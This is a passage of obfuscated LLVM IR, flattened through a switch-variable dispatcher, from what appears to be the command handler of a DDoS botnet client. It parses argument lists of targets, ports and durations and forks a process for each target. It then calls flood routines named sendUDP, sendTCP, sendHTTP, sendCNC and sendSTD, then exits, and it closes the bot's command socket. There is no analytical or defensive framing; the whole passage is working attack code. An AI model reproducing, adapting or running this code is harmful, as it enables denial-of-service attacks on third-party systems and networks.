  store i32 %185, i32* %switchVar
  br label %loopEnd

; <label>:186:                                    ; preds = %loopEntry
  %187 = load i8**, i8*** %4, align 8
  %188 = getelementptr inbounds i8*, i8** %187, i64 5
  %189 = load i8*, i8** %188, align 8
  %190 = call i32 @atoi(i8* %189) #10
  %191 = icmp sgt i32 %190, 65500
  %192 = select i1 %191, i32 1377603253, i32 1263868484
  store i32 %192, i32* %switchVar
  br label %loopEnd

; <label>:193:                                    ; preds = %loopEntry
  %194 = load i8**, i8*** %4, align 8
  %195 = getelementptr inbounds i8*, i8** %194, i64 4
  %196 = load i8*, i8** %195, align 8
  %197 = call i32 @atoi(i8* %196) #10
  %198 = icmp sgt i32 %197, 32
  %199 = select i1 %198, i32 1377603253, i32 1595125829
  store i32 %199, i32* %switchVar
  br label %loopEnd

; <label>:200:                                    ; preds = %loopEntry
  %201 = load i32, i32* %3, align 4
  %202 = icmp eq i32 %201, 7
  %203 = select i1 %202, i32 37846540, i32 -861199428
  store i32 %203, i32* %switchVar
  br label %loopEnd

; <label>:204:                                    ; preds = %loopEntry
  %205 = load i8**, i8*** %4, align 8
  %206 = getelementptr inbounds i8*, i8** %205, i64 6
  %207 = load i8*, i8** %206, align 8
  %208 = call i32 @atoi(i8* %207) #10
  %209 = icmp slt i32 %208, 1
  %210 = select i1 %209, i32 1377603253, i32 -861199428
  store i32 %210, i32* %switchVar
  br label %loopEnd

; <label>:211:                                    ; preds = %loopEntry
  store i32 -828258347, i32* %switchVar
  br label %loopEnd

; <label>:212:                                    ; preds = %loopEntry
  %213 = load i8**, i8*** %4, align 8
  %214 = getelementptr inbounds i8*, i8** %213, i64 1
  %215 = load i8*, i8** %214, align 8
  store i8* %215, i8** %8, align 8
  %216 = load i8**, i8*** %4, align 8
  %217 = getelementptr inbounds i8*, i8** %216, i64 2
  %218 = load i8*, i8** %217, align 8
  %219 = call i32 @atoi(i8* %218) #10
  store i32 %219, i32* %9, align 4
  %220 = load i8**, i8*** %4, align 8
  %221 = getelementptr inbounds i8*, i8** %220, i64 3
  %222 = load i8*, i8** %221, align 8
  %223 = call i32 @atoi(i8* %222) #10
  store i32 %223, i32* %10, align 4
  %224 = load i8**, i8*** %4, align 8
  %225 = getelementptr inbounds i8*, i8** %224, i64 4
  %226 = load i8*, i8** %225, align 8
  %227 = call i32 @atoi(i8* %226) #10
  store i32 %227, i32* %11, align 4
  %228 = load i8**, i8*** %4, align 8
  %229 = getelementptr inbounds i8*, i8** %228, i64 5
  %230 = load i8*, i8** %229, align 8
  %231 = call i32 @atoi(i8* %230) #10
  store i32 %231, i32* %12, align 4
  %232 = load i32, i32* %3, align 4
  %233 = icmp eq i32 %232, 7
  %234 = select i1 %233, i32 1393213747, i32 167894555
  store i32 %234, i32* %switchVar
  br label %loopEnd

; <label>:235:                                    ; preds = %loopEntry
  %236 = load i8**, i8*** %4, align 8
  %237 = getelementptr inbounds i8*, i8** %236, i64 6
  %238 = load i8*, i8** %237, align 8
  %239 = call i32 @atoi(i8* %238) #10
  store i32 1975852827, i32* %switchVar
  store i32 %239, i32* %.reg2mem2
  br label %loopEnd

; <label>:240:                                    ; preds = %loopEntry
  store i32 1975852827, i32* %switchVar
  store i32 10, i32* %.reg2mem2
  br label %loopEnd

; <label>:241:                                    ; preds = %loopEntry
  %.reload3 = load i32, i32* %.reg2mem2
  store i32 %.reload3, i32* %13, align 4
  %242 = load i8*, i8** %8, align 8
  %243 = call i8* @strstr(i8* %242, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #10
  %244 = icmp ne i8* %243, null
  %245 = select i1 %244, i32 1751502761, i32 1538565360
  store i32 %245, i32* %switchVar
  br label %loopEnd

; <label>:246:                                    ; preds = %loopEntry
  %247 = load i8*, i8** %8, align 8
  %248 = call i8* @strtok(i8* %247, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %248, i8** %14, align 8
  store i32 1903887195, i32* %switchVar
  br label %loopEnd

; <label>:249:                                    ; preds = %loopEntry
  %250 = load i8*, i8** %14, align 8
  %251 = icmp ne i8* %250, null
  %252 = select i1 %251, i32 864123156, i32 -874330567
  store i32 %252, i32* %switchVar
  br label %loopEnd

; <label>:253:                                    ; preds = %loopEntry
  %254 = call i32 @listFork()
  %255 = icmp ne i32 %254, 0
  %256 = select i1 %255, i32 -339160266, i32 1732192695
  store i32 %256, i32* %switchVar
  br label %loopEnd

; <label>:257:                                    ; preds = %loopEntry
  %258 = load i8*, i8** %14, align 8
  %259 = load i32, i32* %9, align 4
  %260 = load i32, i32* %10, align 4
  %261 = load i32, i32* %11, align 4
  %262 = load i32, i32* %12, align 4
  %263 = load i32, i32* %13, align 4
  call void @sendUDP(i8* %258, i32 %259, i32 %260, i32 %261, i32 %262, i32 %263)
  call void @_exit(i32 0) #12
  unreachable

; <label>:264:                                    ; preds = %loopEntry
  %265 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %265, i8** %14, align 8
  store i32 1903887195, i32* %switchVar
  br label %loopEnd

; <label>:266:                                    ; preds = %loopEntry
  store i32 671092482, i32* %switchVar
  br label %loopEnd

; <label>:267:                                    ; preds = %loopEntry
  %268 = call i32 @listFork()
  %269 = icmp ne i32 %268, 0
  %270 = select i1 %269, i32 832664683, i32 -2023762369
  store i32 %270, i32* %switchVar
  br label %loopEnd

; <label>:271:                                    ; preds = %loopEntry
  store i32 -828258347, i32* %switchVar
  br label %loopEnd

; <label>:272:                                    ; preds = %loopEntry
  %273 = load i8*, i8** %8, align 8
  %274 = load i32, i32* %9, align 4
  %275 = load i32, i32* %10, align 4
  %276 = load i32, i32* %11, align 4
  %277 = load i32, i32* %12, align 4
  %278 = load i32, i32* %13, align 4
  call void @sendUDP(i8* %273, i32 %274, i32 %275, i32 %276, i32 %277, i32 %278)
  call void @_exit(i32 0) #12
  unreachable

; <label>:279:                                    ; preds = %loopEntry
  store i32 -1556906766, i32* %switchVar
  br label %loopEnd

; <label>:280:                                    ; preds = %loopEntry
  %281 = load i8**, i8*** %4, align 8
  %282 = getelementptr inbounds i8*, i8** %281, i64 0
  %283 = load i8*, i8** %282, align 8
  %284 = call i32 @strcmp(i8* %283, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.106, i32 0, i32 0)) #10
  %285 = icmp ne i32 %284, 0
  %286 = select i1 %285, i32 -1674602734, i32 231612662
  store i32 %286, i32* %switchVar
  br label %loopEnd

; <label>:287:                                    ; preds = %loopEntry
  %288 = load i32, i32* %3, align 4
  %289 = icmp slt i32 %288, 6
  %290 = select i1 %289, i32 88335829, i32 62071220
  store i32 %290, i32* %switchVar
  br label %loopEnd

; <label>:291:                                    ; preds = %loopEntry
  %292 = load i8**, i8*** %4, align 8
  %293 = getelementptr inbounds i8*, i8** %292, i64 3
  %294 = load i8*, i8** %293, align 8
  %295 = call i32 @atoi(i8* %294) #10
  %296 = icmp eq i32 %295, -1
  %297 = select i1 %296, i32 88335829, i32 -1971302390
  store i32 %297, i32* %switchVar
  br label %loopEnd

; <label>:298:                                    ; preds = %loopEntry
  %299 = load i8**, i8*** %4, align 8
  %300 = getelementptr inbounds i8*, i8** %299, i64 2
  %301 = load i8*, i8** %300, align 8
  %302 = call i32 @atoi(i8* %301) #10
  %303 = icmp eq i32 %302, -1
  %304 = select i1 %303, i32 88335829, i32 -1868043526
  store i32 %304, i32* %switchVar
  br label %loopEnd

; <label>:305:                                    ; preds = %loopEntry
  %306 = load i8**, i8*** %4, align 8
  %307 = getelementptr inbounds i8*, i8** %306, i64 4
  %308 = load i8*, i8** %307, align 8
  %309 = call i32 @atoi(i8* %308) #10
  %310 = icmp eq i32 %309, -1
  %311 = select i1 %310, i32 88335829, i32 1357453898
  store i32 %311, i32* %switchVar
  br label %loopEnd

; <label>:312:                                    ; preds = %loopEntry
  %313 = load i8**, i8*** %4, align 8
  %314 = getelementptr inbounds i8*, i8** %313, i64 4
  %315 = load i8*, i8** %314, align 8
  %316 = call i32 @atoi(i8* %315) #10
  %317 = icmp sgt i32 %316, 32
  %318 = select i1 %317, i32 88335829, i32 -1525351705
  store i32 %318, i32* %switchVar
  br label %loopEnd

; <label>:319:                                    ; preds = %loopEntry
  %320 = load i32, i32* %3, align 4
  %321 = icmp sgt i32 %320, 6
  %322 = select i1 %321, i32 1604498850, i32 -330895269
  store i32 %322, i32* %switchVar
  br label %loopEnd

; <label>:323:                                    ; preds = %loopEntry
  %324 = load i8**, i8*** %4, align 8
  %325 = getelementptr inbounds i8*, i8** %324, i64 6
  %326 = load i8*, i8** %325, align 8
  %327 = call i32 @atoi(i8* %326) #10
  %328 = icmp slt i32 %327, 0
  %329 = select i1 %328, i32 88335829, i32 -330895269
  store i32 %329, i32* %switchVar
  br label %loopEnd

; <label>:330:                                    ; preds = %loopEntry
  %331 = load i32, i32* %3, align 4
  %332 = icmp eq i32 %331, 8
  %333 = select i1 %332, i32 -430203588, i32 -1903217845
  store i32 %333, i32* %switchVar
  br label %loopEnd

; <label>:334:                                    ; preds = %loopEntry
  %335 = load i8**, i8*** %4, align 8
  %336 = getelementptr inbounds i8*, i8** %335, i64 7
  %337 = load i8*, i8** %336, align 8
  %338 = call i32 @atoi(i8* %337) #10
  %339 = icmp slt i32 %338, 1
  %340 = select i1 %339, i32 88335829, i32 -1903217845
  store i32 %340, i32* %switchVar
  br label %loopEnd

; <label>:341:                                    ; preds = %loopEntry
  store i32 -828258347, i32* %switchVar
  br label %loopEnd

; <label>:342:                                    ; preds = %loopEntry
  %343 = load i8**, i8*** %4, align 8
  %344 = getelementptr inbounds i8*, i8** %343, i64 1
  %345 = load i8*, i8** %344, align 8
  store i8* %345, i8** %15, align 8
  %346 = load i8**, i8*** %4, align 8
  %347 = getelementptr inbounds i8*, i8** %346, i64 2
  %348 = load i8*, i8** %347, align 8
  %349 = call i32 @atoi(i8* %348) #10
  store i32 %349, i32* %16, align 4
  %350 = load i8**, i8*** %4, align 8
  %351 = getelementptr inbounds i8*, i8** %350, i64 3
  %352 = load i8*, i8** %351, align 8
  %353 = call i32 @atoi(i8* %352) #10
  store i32 %353, i32* %17, align 4
  %354 = load i8**, i8*** %4, align 8
  %355 = getelementptr inbounds i8*, i8** %354, i64 4
  %356 = load i8*, i8** %355, align 8
  %357 = call i32 @atoi(i8* %356) #10
  store i32 %357, i32* %18, align 4
  %358 = load i8**, i8*** %4, align 8
  %359 = getelementptr inbounds i8*, i8** %358, i64 5
  %360 = load i8*, i8** %359, align 8
  store i8* %360, i8** %19, align 8
  %361 = load i32, i32* %3, align 4
  %362 = icmp eq i32 %361, 8
  %363 = select i1 %362, i32 -465647468, i32 1118036828
  store i32 %363, i32* %switchVar
  br label %loopEnd

; <label>:364:                                    ; preds = %loopEntry
  %365 = load i8**, i8*** %4, align 8
  %366 = getelementptr inbounds i8*, i8** %365, i64 7
  %367 = load i8*, i8** %366, align 8
  %368 = call i32 @atoi(i8* %367) #10
  store i32 2120501471, i32* %switchVar
  store i32 %368, i32* %.reg2mem4
  br label %loopEnd

; <label>:369:                                    ; preds = %loopEntry
  store i32 2120501471, i32* %switchVar
  store i32 10, i32* %.reg2mem4
  br label %loopEnd

; <label>:370:                                    ; preds = %loopEntry
  %.reload5 = load i32, i32* %.reg2mem4
  store i32 %.reload5, i32* %20, align 4
  %371 = load i32, i32* %3, align 4
  %372 = icmp sgt i32 %371, 6
  %373 = select i1 %372, i32 -1458213178, i32 -1200312695
  store i32 %373, i32* %switchVar
  br label %loopEnd

; <label>:374:                                    ; preds = %loopEntry
  %375 = load i8**, i8*** %4, align 8
  %376 = getelementptr inbounds i8*, i8** %375, i64 6
  %377 = load i8*, i8** %376, align 8
  %378 = call i32 @atoi(i8* %377) #10
  store i32 1329446279, i32* %switchVar
  store i32 %378, i32* %.reg2mem6
  br label %loopEnd

; <label>:379:                                    ; preds = %loopEntry
  store i32 1329446279, i32* %switchVar
  store i32 0, i32* %.reg2mem6
  br label %loopEnd

; <label>:380:                                    ; preds = %loopEntry
  %.reload7 = load i32, i32* %.reg2mem6
  store i32 %.reload7, i32* %21, align 4
  %381 = load i8*, i8** %15, align 8
  %382 = call i8* @strstr(i8* %381, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #10
  %383 = icmp ne i8* %382, null
  %384 = select i1 %383, i32 -2136080305, i32 497344505
  store i32 %384, i32* %switchVar
  br label %loopEnd

; <label>:385:                                    ; preds = %loopEntry
  %386 = load i8*, i8** %15, align 8
  %387 = call i8* @strtok(i8* %386, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %387, i8** %22, align 8
  store i32 896828621, i32* %switchVar
  br label %loopEnd

; <label>:388:                                    ; preds = %loopEntry
  %389 = load i8*, i8** %22, align 8
  %390 = icmp ne i8* %389, null
  %391 = select i1 %390, i32 -613667083, i32 1842861861
  store i32 %391, i32* %switchVar
  br label %loopEnd

; <label>:392:                                    ; preds = %loopEntry
  %393 = call i32 @listFork()
  %394 = icmp ne i32 %393, 0
  %395 = select i1 %394, i32 -1562915316, i32 -364028471
  store i32 %395, i32* %switchVar
  br label %loopEnd

; <label>:396:                                    ; preds = %loopEntry
  %397 = load i8*, i8** %22, align 8
  %398 = load i32, i32* %16, align 4
  %399 = load i32, i32* %17, align 4
  %400 = load i32, i32* %18, align 4
  %401 = load i8*, i8** %19, align 8
  %402 = load i32, i32* %21, align 4
  %403 = load i32, i32* %20, align 4
  call void @sendTCP(i8* %397, i32 %398, i32 %399, i32 %400, i8* %401, i32 %402, i32 %403)
  call void @_exit(i32 0) #12
  unreachable

; <label>:404:                                    ; preds = %loopEntry
  %405 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %405, i8** %22, align 8
  store i32 896828621, i32* %switchVar
  br label %loopEnd

; <label>:406:                                    ; preds = %loopEntry
  store i32 2033484678, i32* %switchVar
  br label %loopEnd

; <label>:407:                                    ; preds = %loopEntry
  %408 = call i32 @listFork()
  %409 = icmp ne i32 %408, 0
  %410 = select i1 %409, i32 -1752533682, i32 -896646360
  store i32 %410, i32* %switchVar
  br label %loopEnd

; <label>:411:                                    ; preds = %loopEntry
  store i32 -828258347, i32* %switchVar
  br label %loopEnd

; <label>:412:                                    ; preds = %loopEntry
  %413 = load i8*, i8** %15, align 8
  %414 = load i32, i32* %16, align 4
  %415 = load i32, i32* %17, align 4
  %416 = load i32, i32* %18, align 4
  %417 = load i8*, i8** %19, align 8
  %418 = load i32, i32* %21, align 4
  %419 = load i32, i32* %20, align 4
  call void @sendTCP(i8* %413, i32 %414, i32 %415, i32 %416, i8* %417, i32 %418, i32 %419)
  call void @_exit(i32 0) #12
  unreachable

; <label>:420:                                    ; preds = %loopEntry
  store i32 -1674602734, i32* %switchVar
  br label %loopEnd

; <label>:421:                                    ; preds = %loopEntry
  %422 = load i8**, i8*** %4, align 8
  %423 = getelementptr inbounds i8*, i8** %422, i64 0
  %424 = load i8*, i8** %423, align 8
  %425 = call i32 @strcmp(i8* %424, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.107, i32 0, i32 0)) #10
  %426 = icmp ne i32 %425, 0
  %427 = select i1 %426, i32 -917065137, i32 594828245
  store i32 %427, i32* %switchVar
  br label %loopEnd

; <label>:428:                                    ; preds = %loopEntry
  %429 = load i32, i32* %3, align 4
  %430 = icmp slt i32 %429, 3
  %431 = select i1 %430, i32 406001836, i32 -769159749
  store i32 %431, i32* %switchVar
  br label %loopEnd

; <label>:432:                                    ; preds = %loopEntry
  %433 = load i8**, i8*** %4, align 8
  %434 = getelementptr inbounds i8*, i8** %433, i64 2
  %435 = load i8*, i8** %434, align 8
  %436 = call i32 @atoi(i8* %435) #10
  %437 = icmp slt i32 %436, 1
  %438 = select i1 %437, i32 406001836, i32 -1821664419
  store i32 %438, i32* %switchVar
  br label %loopEnd

; <label>:439:                                    ; preds = %loopEntry
  store i32 -828258347, i32* %switchVar
  br label %loopEnd

; <label>:440:                                    ; preds = %loopEntry
  %441 = load i8**, i8*** %4, align 8
  %442 = getelementptr inbounds i8*, i8** %441, i64 1
  %443 = load i8*, i8** %442, align 8
  store i8* %443, i8** %23, align 8
  %444 = load i8**, i8*** %4, align 8
  %445 = getelementptr inbounds i8*, i8** %444, i64 2
  %446 = load i8*, i8** %445, align 8
  %447 = call i32 @atoi(i8* %446) #10
  store i32 %447, i32* %24, align 4
  %448 = load i8*, i8** %23, align 8
  %449 = call i8* @strstr(i8* %448, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #10
  %450 = icmp ne i8* %449, null
  %451 = select i1 %450, i32 -927822018, i32 142960752
  store i32 %451, i32* %switchVar
  br label %loopEnd

; <label>:452:                                    ; preds = %loopEntry
  %453 = load i8*, i8** %23, align 8
  %454 = call i8* @strtok(i8* %453, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %454, i8** %25, align 8
  store i32 -580572965, i32* %switchVar
  br label %loopEnd

; <label>:455:                                    ; preds = %loopEntry
  %456 = load i8*, i8** %25, align 8
  %457 = icmp ne i8* %456, null
  %458 = select i1 %457, i32 435493501, i32 1457918520
  store i32 %458, i32* %switchVar
  br label %loopEnd

; <label>:459:                                    ; preds = %loopEntry
  %460 = call i32 @listFork()
  %461 = icmp ne i32 %460, 0
  %462 = select i1 %461, i32 830573973, i32 1380406295
  store i32 %462, i32* %switchVar
  br label %loopEnd

; <label>:463:                                    ; preds = %loopEntry
  store i32 0, i32* %26, align 4
  store i32 -1988062338, i32* %switchVar
  br label %loopEnd

; <label>:464:                                    ; preds = %loopEntry
  %465 = load i32, i32* %26, align 4
  %466 = icmp slt i32 %465, 10
  %467 = select i1 %466, i32 -567718053, i32 316530829
  store i32 %467, i32* %switchVar
  br label %loopEnd

; <label>:468:                                    ; preds = %loopEntry
  %469 = load i8*, i8** %23, align 8
  %470 = load i32, i32* %24, align 4
  call void @sendHTTP(i8* %469, i32 %470)
  %471 = load i32, i32* %26, align 4
  %472 = add nsw i32 %471, 1
  store i32 %472, i32* %26, align 4
  store i32 -1988062338, i32* %switchVar
  br label %loopEnd

; <label>:473:                                    ; preds = %loopEntry
  %474 = load i32, i32* @mainCommSock, align 4
  %475 = call i32 @close(i32 %474)
  call void @_exit(i32 0) #12
  unreachable

; <label>:476:                                    ; preds = %loopEntry
  %477 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %477, i8** %25, align 8
  store i32 -580572965, i32* %switchVar
  br label %loopEnd

; <label>:478:                                    ; preds = %loopEntry
  store i32 -1385960541, i32* %switchVar
  br label %loopEnd

; <label>:479:                                    ; preds = %loopEntry
  %480 = call i32 @listFork()
  %481 = icmp ne i32 %480, 0
  %482 = select i1 %481, i32 -1503266482, i32 1458267936
  store i32 %482, i32* %switchVar
  br label %loopEnd

; <label>:483:                                    ; preds = %loopEntry
  store i32 -828258347, i32* %switchVar
  br label %loopEnd

; <label>:484:                                    ; preds = %loopEntry
  store i32 0, i32* %27, align 4
  store i32 1219123281, i32* %switchVar
  br label %loopEnd

; <label>:485:                                    ; preds = %loopEntry
  %486 = load i32, i32* %27, align 4
  %487 = icmp slt i32 %486, 10
  %488 = select i1 %487, i32 1840458343, i32 -413597161
  store i32 %488, i32* %switchVar
  br label %loopEnd

; <label>:489:                                    ; preds = %loopEntry
  %490 = load i8*, i8** %23, align 8
  %491 = load i32, i32* %24, align 4
  call void @sendHTTP(i8* %490, i32 %491)
  %492 = load i32, i32* %27, align 4
  %493 = add nsw i32 %492, 1
  store i32 %493, i32* %27, align 4
  store i32 1219123281, i32* %switchVar
  br label %loopEnd

; <label>:494:                                    ; preds = %loopEntry
  %495 = load i32, i32* @mainCommSock, align 4
  %496 = call i32 @close(i32 %495)
  call void @_exit(i32 0) #12
  unreachable

; <label>:497:                                    ; preds = %loopEntry
  store i32 -917065137, i32* %switchVar
  br label %loopEnd

; <label>:498:                                    ; preds = %loopEntry
  %499 = load i8**, i8*** %4, align 8
  %500 = getelementptr inbounds i8*, i8** %499, i64 0
  %501 = load i8*, i8** %500, align 8
  %502 = call i32 @strcmp(i8* %501, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.108, i32 0, i32 0)) #10
  %503 = icmp ne i32 %502, 0
  %504 = select i1 %503, i32 -880581875, i32 -1427850751
  store i32 %504, i32* %switchVar
  br label %loopEnd

; <label>:505:                                    ; preds = %loopEntry
  %506 = load i32, i32* %3, align 4
  %507 = icmp slt i32 %506, 4
  %508 = select i1 %507, i32 -625334240, i32 -1678683620
  store i32 %508, i32* %switchVar
  br label %loopEnd

; <label>:509:                                    ; preds = %loopEntry
  %510 = load i8**, i8*** %4, align 8
  %511 = getelementptr inbounds i8*, i8** %510, i64 2
  %512 = load i8*, i8** %511, align 8
  %513 = call i32 @atoi(i8* %512) #10
  %514 = icmp slt i32 %513, 1
  %515 = select i1 %514, i32 -625334240, i32 -2011120831
  store i32 %515, i32* %switchVar
  br label %loopEnd

; <label>:516:                                    ; preds = %loopEntry
  %517 = load i8**, i8*** %4, align 8
  %518 = getelementptr inbounds i8*, i8** %517, i64 3
  %519 = load i8*, i8** %518, align 8
  %520 = call i32 @atoi(i8* %519) #10
  %521 = icmp slt i32 %520, 1
  %522 = select i1 %521, i32 -625334240, i32 -742586564
  store i32 %522, i32* %switchVar
  br label %loopEnd

; <label>:523:                                    ; preds = %loopEntry
  store i32 -828258347, i32* %switchVar
  br label %loopEnd

; <label>:524:                                    ; preds = %loopEntry
  %525 = load i8**, i8*** %4, align 8
  %526 = getelementptr inbounds i8*, i8** %525, i64 1
  %527 = load i8*, i8** %526, align 8
  store i8* %527, i8** %28, align 8
  %528 = load i8**, i8*** %4, align 8
  %529 = getelementptr inbounds i8*, i8** %528, i64 2
  %530 = load i8*, i8** %529, align 8
  %531 = call i32 @atoi(i8* %530) #10
  store i32 %531, i32* %29, align 4
  %532 = load i8**, i8*** %4, align 8
  %533 = getelementptr inbounds i8*, i8** %532, i64 3
  %534 = load i8*, i8** %533, align 8
  %535 = call i32 @atoi(i8* %534) #10
  store i32 %535, i32* %30, align 4
  %536 = load i8*, i8** %28, align 8
  %537 = call i8* @strstr(i8* %536, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #10
  %538 = icmp ne i8* %537, null
  %539 = select i1 %538, i32 33908432, i32 -1613410535
  store i32 %539, i32* %switchVar
  br label %loopEnd

; <label>:540:                                    ; preds = %loopEntry
  %541 = load i8*, i8** %28, align 8
  %542 = call i8* @strtok(i8* %541, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %542, i8** %31, align 8
  store i32 -751523081, i32* %switchVar
  br label %loopEnd

; <label>:543:                                    ; preds = %loopEntry
  %544 = load i8*, i8** %31, align 8
  %545 = icmp ne i8* %544, null
  %546 = select i1 %545, i32 -2022922031, i32 -1652481809
  store i32 %546, i32* %switchVar
  br label %loopEnd

; <label>:547:                                    ; preds = %loopEntry
  %548 = call i32 @listFork()
  %549 = icmp ne i32 %548, 0
  %550 = select i1 %549, i32 1460690960, i32 -616709661
  store i32 %550, i32* %switchVar
  br label %loopEnd

; <label>:551:                                    ; preds = %loopEntry
  %552 = load i8*, i8** %31, align 8
  %553 = load i32, i32* %29, align 4
  %554 = load i32, i32* %30, align 4
  call void @sendCNC(i8* %552, i32 %553, i32 %554)
  %555 = load i32, i32* @mainCommSock, align 4
  %556 = call i32 @close(i32 %555)
  call void @_exit(i32 0) #12
  unreachable

; <label>:557:                                    ; preds = %loopEntry
  %558 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %558, i8** %31, align 8
  store i32 -751523081, i32* %switchVar
  br label %loopEnd

; <label>:559:                                    ; preds = %loopEntry
  store i32 1844628151, i32* %switchVar
  br label %loopEnd

; <label>:560:                                    ; preds = %loopEntry
  %561 = call i32 @listFork()
  %562 = icmp ne i32 %561, 0
  %563 = select i1 %562, i32 -1626590505, i32 407663619
  store i32 %563, i32* %switchVar
  br label %loopEnd

; <label>:564:                                    ; preds = %loopEntry
  store i32 -828258347, i32* %switchVar
  br label %loopEnd

; <label>:565:                                    ; preds = %loopEntry
  %566 = load i8*, i8** %28, align 8
  %567 = load i32, i32* %29, align 4
  %568 = load i32, i32* %30, align 4
  call void @sendCNC(i8* %566, i32 %567, i32 %568)
  call void @_exit(i32 0) #12
  unreachable

; <label>:569:                                    ; preds = %loopEntry
  store i32 -880581875, i32* %switchVar
  br label %loopEnd

; <label>:570:                                    ; preds = %loopEntry
  %571 = load i8**, i8*** %4, align 8
  %572 = getelementptr inbounds i8*, i8** %571, i64 0
  %573 = load i8*, i8** %572, align 8
  %574 = call i32 @strcmp(i8* %573, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.109, i32 0, i32 0)) #10
  %575 = icmp ne i32 %574, 0
  %576 = select i1 %575, i32 -541256084, i32 -95583410
  store i32 %576, i32* %switchVar
  br label %loopEnd

; <label>:577:                                    ; preds = %loopEntry
  %578 = load i32, i32* %3, align 4
  %579 = icmp slt i32 %578, 4
  %580 = select i1 %579, i32 -1688097553, i32 -2141465057
  store i32 %580, i32* %switchVar
  br label %loopEnd

; <label>:581:                                    ; preds = %loopEntry
  %582 = load i8**, i8*** %4, align 8
  %583 = getelementptr inbounds i8*, i8** %582, i64 2
  %584 = load i8*, i8** %583, align 8
  %585 = call i32 @atoi(i8* %584) #10
  %586 = icmp slt i32 %585, 1
  %587 = select i1 %586, i32 -1688097553, i32 842109040
  store i32 %587, i32* %switchVar
  br label %loopEnd

; <label>:588:                                    ; preds = %loopEntry
  %589 = load i8**, i8*** %4, align 8
  %590 = getelementptr inbounds i8*, i8** %589, i64 3
  %591 = load i8*, i8** %590, align 8
  %592 = call i32 @atoi(i8* %591) #10
  %593 = icmp slt i32 %592, 1
  %594 = select i1 %593, i32 -1688097553, i32 613304421
  store i32 %594, i32* %switchVar
  br label %loopEnd

; <label>:595:                                    ; preds = %loopEntry
  store i32 -828258347, i32* %switchVar
  br label %loopEnd

; <label>:596:                                    ; preds = %loopEntry
  %597 = load i8**, i8*** %4, align 8
  %598 = getelementptr inbounds i8*, i8** %597, i64 1
  %599 = load i8*, i8** %598, align 8
  store i8* %599, i8** %32, align 8
  %600 = load i8**, i8*** %4, align 8
  %601 = getelementptr inbounds i8*, i8** %600, i64 2
  %602 = load i8*, i8** %601, align 8
  %603 = call i32 @atoi(i8* %602) #10
  store i32 %603, i32* %33, align 4
  %604 = load i8**, i8*** %4, align 8
  %605 = getelementptr inbounds i8*, i8** %604, i64 3
  %606 = load i8*, i8** %605, align 8
  %607 = call i32 @atoi(i8* %606) #10
  store i32 %607, i32* %34, align 4
  %608 = load i8*, i8** %32, align 8
  %609 = call i8* @strstr(i8* %608, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #10
  %610 = icmp ne i8* %609, null
  %611 = select i1 %610, i32 -1130962762, i32 -1472322160
  store i32 %611, i32* %switchVar
  br label %loopEnd

; <label>:612:                                    ; preds = %loopEntry
  %613 = load i8*, i8** %32, align 8
  %614 = call i8* @strtok(i8* %613, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %614, i8** %35, align 8
  store i32 744393519, i32* %switchVar
  br label %loopEnd

; <label>:615:                                    ; preds = %loopEntry
  %616 = load i8*, i8** %35, align 8
  %617 = icmp ne i8* %616, null
  %618 = select i1 %617, i32 94822463, i32 -1169049215
  store i32 %618, i32* %switchVar
  br label %loopEnd

; <label>:619:                                    ; preds = %loopEntry
  %620 = call i32 @listFork()
  %621 = icmp ne i32 %620, 0
  %622 = select i1 %621, i32 -1981954200, i32 -341261731
  store i32 %622, i32* %switchVar
  br label %loopEnd

; <label>:623:                                    ; preds = %loopEntry
  %624 = load i8*, i8** %35, align 8
  %625 = load i32, i32* %33, align 4
  %626 = load i32, i32* %34, align 4
  call void @sendSTD(i8* %624, i32 %625, i32 %626)
  call void @_exit(i32 0) #12
  unreachable

; <label>:627:                                    ; preds = %loopEntry
  %628 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %628, i8** %35, align 8
  store i32 744393519, i32* %switchVar
  br label %loopEnd

; <label>:629:                                    ; preds = %loopEntry
  store i32 -959556403, i32* %switchVar
  br label %loopEnd

; <label>:630:                                    ; preds = %loopEntry
  %631 = call i32 @listFork()
  %632 = icmp ne i32 %631, 0
  %633 = select i1 %632, i32 -899161065, i32 1421328689
  store i32 %633, i32* %switchVar
  br label %loopEnd

; <label>:634:                                    ; preds = %loopEntry
  store i32 -828258347, i32* %switchVar
  br label %loopEnd

; <label>:635:                                    ; preds = %loopEntry
  %636 = load i8*, i8** %32, align 8
  %637 = load i32, i32* %33, align 4
  %638 = load i32, i32* %34, align 4
  call void @sendSTD(i8* %636, i32 %637, i32 %638)
  call void @_exit(i32 0) #12
  unreachable

; <label>:639:                                    ; preds = %loopEntry
  store i32 -541256084, i32* %switchVar
  br label %loopEnd

; <label>:640:                                    ; preds = %loopEntry
  %641 = load i8**, i8*** %4, align 8
  %642 = getelementptr inbounds i8*, i8** %641, i64 0
  %643 = load i8*, i8** %642, align 8
